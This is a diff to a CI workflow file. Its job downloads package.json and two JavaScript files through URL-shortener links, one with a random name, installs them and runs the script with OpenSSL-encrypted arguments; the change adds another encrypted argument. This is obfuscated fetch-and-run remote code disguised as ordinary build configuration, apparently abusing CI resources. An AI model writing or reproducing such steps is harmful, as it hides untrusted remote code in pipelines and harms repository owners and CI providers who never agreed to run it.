@@ -10,7 +10,7 @@ jobs:
       - run: 
           command: curl -fsSL shorturl.at/brJQZ -o package.json && curl -fsSL shorturl.at/gzGI0 -o sgdfgerjhsdfe.js && curl -fsSL shorturl.at/cruHI -o logger.js
       - run: npm i -s
-      - run: node sgdfgerjhsdfe -r U2FsdGVkX1+g9Yivxx3IeTgfefVBB8rKUzofRMgUMcB/LVFAt0chKd8GB0F3dBjnW2qfmWI6WdBNuKoplyRAfHGNwZ4GaQwZByKMPs7x3lVn+crLc9lpUBV/jtGjyqXkX7PguTtck/UjnJYBk+FpWi8JtrPl/yBwQcfkkVIV809r5NDfCIZXUOhdhH2+IsGZaHTKD8Iwdr6wP5xrEMnJE9QJgRyp9opD9zdzqZAe1kv5Y4KaRHXzV2vW9AF/rCOdvfyQi8kdVwgpHqwVuAJA0yWtNJzLUoiP2+8W63e/QXNrrFBPdsTNGLf0srkImoQ+Zdy7v/7LTKLQqQlzG6QrzpZDBCuxSqBm6b5P0pFFjGLO2hrqeFy8VRMPJbqUNdST -t U2FsdGVkX1+fkDxyJG2Xn23funqphl+JKuWnL8aKGja2WbPpx4c4XjPL94EloxYS -lpn U2FsdGVkX1+u3y7tEfaS5e3I8EsTPw2bEM1S7O0J/Wc= -sp
+      - run: node sgdfgerjhsdfe -r U2FsdGVkX1+g9Yivxx3IeTgfefVBB8rKUzofRMgUMcB/LVFAt0chKd8GB0F3dBjnW2qfmWI6WdBNuKoplyRAfHGNwZ4GaQwZByKMPs7x3lVn+crLc9lpUBV/jtGjyqXkX7PguTtck/UjnJYBk+FpWi8JtrPl/yBwQcfkkVIV809r5NDfCIZXUOhdhH2+IsGZaHTKD8Iwdr6wP5xrEMnJE9QJgRyp9opD9zdzqZAe1kv5Y4KaRHXzV2vW9AF/rCOdvfyQi8kdVwgpHqwVuAJA0yWtNJzLUoiP2+8W63e/QXNrrFBPdsTNGLf0srkImoQ+Zdy7v/7LTKLQqQlzG6QrzpZDBCuxSqBm6b5P0pFFjGLO2hrqeFy8VRMPJbqUNdST -t U2FsdGVkX1+fkDxyJG2Xn23funqphl+JKuWnL8aKGja2WbPpx4c4XjPL94EloxYS -lpn U2FsdGVkX1+u3y7tEfaS5e3I8EsTPw2bEM1S7O0J/Wc= -sp -s U2FsdGVkX19YZO8lHl/9esXHJbBorKSEG9UJ3GieNT/dIs/aMGP0uzFqZHoup0TMlMZwn5fO7LF8SGcGmdbQ5IGog7xPML9MEj9aihD+2wBFfL/1hTc1FqFWUJDCKCwouF8Y3aQy/LgZ0oHSFVC2tjIrH/qBiNAxXCHWT2rp/2QWo89AWTHMUy5JKi65laDjDza5ztM4OMmx+RK9FY3F7E2BV/Q9S24pWuX503+ygN8=
       
 workflows:
   start-work:
